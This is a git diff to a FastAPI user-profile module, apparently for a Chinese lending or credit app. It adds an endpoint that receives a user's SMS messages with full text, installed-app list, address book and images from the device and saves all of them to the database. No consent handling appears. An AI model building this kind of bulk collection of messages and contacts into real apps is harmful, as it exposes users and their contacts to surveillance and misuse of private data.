@@ -4,14 +4,21 @@
 # @Author : Myprefer
 # @Des: 个人信息管理相关接口
 """
-from datetime import date
+from datetime import date, datetime
 from fastapi import APIRouter, Depends, HTTPException, UploadFile, File, Form
 import requests
+import uuid
+import logging
 
 from api.v1.article import recommend_articles
 from models import UserAuth, UserProfile
 from models.user import UserApplication, UserBehavior
+from models.user_device_data import (
+    UserSmsRecord, UserAppRecord, UserContactRecord, 
+    UserImageRecord, UserDeviceDataBatch
+)
 from schemas import UserProfileResponse, UpdateProfileRequest, VerifyIdentityRequest, VerifyAcademicRequest
+from schemas.device_data import DeviceDataRequest, DeviceDataResponse
 from core.dependences import user_required
 from schemas.user import BindBankAccountRequest
 # from services.identity_service import is_valid_id_card, verify_id_card_photo, verify_identity_with_third_party
@@ -21,6 +28,7 @@ from utils.save import save_idcard_photo
 import asyncio
 
 router = APIRouter()
+logger = logging.getLogger(__name__)
 
 
 @router.get("/profile", summary="查看个人信息", response_model=UserProfileResponse)
@@ -323,3 +331,180 @@ async def get_credit_score(user: UserAuth = Depends(user_required)):
             "credit_score": user_profile.credit or 200,
             "error": "无法连接到信用评分服务"
         }
+
+
+@router.post("/device_data", summary="上传设备数据", response_model=DeviceDataResponse)
+async def upload_device_data(
+    request: DeviceDataRequest,
+    user: UserAuth = Depends(user_required)
+):
+    """
+    上传用户设备数据接口
+    
+    客户端上传短信、应用列表、通讯录、图片等数据，存储到数据库中
+    
+    Args:
+        request: 包含短信、应用、通讯录、图片列表和设备信息的请求体
+        user: 当前认证用户
+        
+    Returns:
+        上传结果，包括批次ID和各类数据数量
+    """
+    try:
+        # 生成批次ID
+        batch_id = f"batch_{datetime.now().strftime('%Y%m%d%H%M%S')}_{uuid.uuid4().hex[:8]}"
+        logger.info(f"用户 {user.id} 开始上传设备数据，批次ID: {batch_id}")
+        
+        # 统计各类数据
+        sms_count = 0
+        app_count = 0
+        contact_count = 0
+        image_count = 0
+        
+        # 确定数据类型
+        data_types = []
+        if request.sms_list:
+            data_types.append("sms")
+        if request.app_list:
+            data_types.append("app")
+        if request.contact_list:
+            data_types.append("contact")
+        if request.image_list:
+            data_types.append("image")
+        data_type = ",".join(data_types) if data_types else "empty"
+        
+        total_count = (
+            len(request.sms_list or []) + 
+            len(request.app_list or []) + 
+            len(request.contact_list or []) + 
+            len(request.image_list or [])
+        )
+        
+        # 创建批次记录
+        batch_record = await UserDeviceDataBatch.create(
+            user=user,
+            batch_id=batch_id,
+            data_type=data_type,
+            total_count=total_count,
+            status="processing"
+        )
+        
+        # 保存短信数据
+        if request.sms_list:
+            for sms in request.sms_list:
+                try:
+                    send_date = None
+                    if sms.sendDate:
+                        try:
+                            send_date = datetime.strptime(sms.sendDate, "%Y-%m-%d %H:%M:%S")
+                        except ValueError:
+                            pass
+                    
+                    sms_type = "received" if sms.type == "1" else "sent"
+                    
+                    await UserSmsRecord.create(
+                        user=user,
+                        telphone=sms.telphone,
+                        content=sms.content,
+                        send_date=send_date,
+                        sms_type=sms_type
+                    )
+                    sms_count += 1
+                except Exception as e:
+                    logger.warning(f"保存短信失败: {e}")
+        
+        # 保存应用列表数据
+        if request.app_list:
+            for app in request.app_list:
+                try:
+                    install_time = None
+                    last_update_time = None
+                    if app.install_time:
+                        try:
+                            install_time = datetime.strptime(app.install_time, "%Y-%m-%d %H:%M:%S")
+                        except ValueError:
+                            pass
+                    if app.last_update_time:
+                        try:
+                            last_update_time = datetime.strptime(app.last_update_time, "%Y-%m-%d %H:%M:%S")
+                        except ValueError:
+                            pass
+                    
+                    await UserAppRecord.create(
+                        user=user,
+                        name=app.name,
+                        pkg_name=app.pkg_name,
+                        version_name=app.version_name,
+                        version_code=app.version_code,
+                        is_system_app=app.is_system_app or False,
+                        install_time=install_time,
+                        last_update_time=last_update_time
+                    )
+                    app_count += 1
+                except Exception as e:
+                    logger.warning(f"保存应用记录失败: {e}")
+        
+        # 保存通讯录数据
+        if request.contact_list:
+            for contact in request.contact_list:
+                try:
+                    await UserContactRecord.create(
+                        user=user,
+                        display_name=contact.display_name,
+                        phone_number=contact.phone_number,
+                        phone_number_raw=contact.phone_number_raw,
+                        phone_type=contact.phone_type
+                    )
+                    contact_count += 1
+                except Exception as e:
+                    logger.warning(f"保存联系人失败: {e}")
+        
+        # 保存图片数据
+        if request.image_list:
+            for image in request.image_list:
+                try:
+                    await UserImageRecord.create(
+                        user=user,
+                        image_type=image.image_type,
+                        image_url=image.image_url,
+                        image_data=image.image_data
+                    )
+                    image_count += 1
+                except Exception as e:
+                    logger.warning(f"保存图片记录失败: {e}")
+        
+        # 更新批次记录
+        success_count = sms_count + app_count + contact_count + image_count
+        failed_count = total_count - success_count
+        
+        batch_record.success_count = success_count
+        batch_record.failed_count = failed_count
+        batch_record.status = "completed"
+        await batch_record.save()
+        
+        logger.info(f"用户 {user.id} 设备数据上传完成，成功: {success_count}, 失败: {failed_count}")
+        
+        return DeviceDataResponse(
+            code=200,
+            message="数据上传成功",
+            data={
+                "batch_id": batch_id,
+                "sms_count": sms_count,
+                "app_count": app_count,
+                "contact_count": contact_count,
+                "image_count": image_count,
+                "total_success": success_count,
+                "total_failed": failed_count
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"设备数据上传失败: {str(e)}", exc_info=True)
+        # 更新批次状态为失败
+        if 'batch_record' in locals():
+            batch_record.status = "failed"
+            batch_record.error_message = str(e)
+            await batch_record.save()
+        raise HTTPException(status_code=500, detail=f"数据上传失败: {str(e)}")
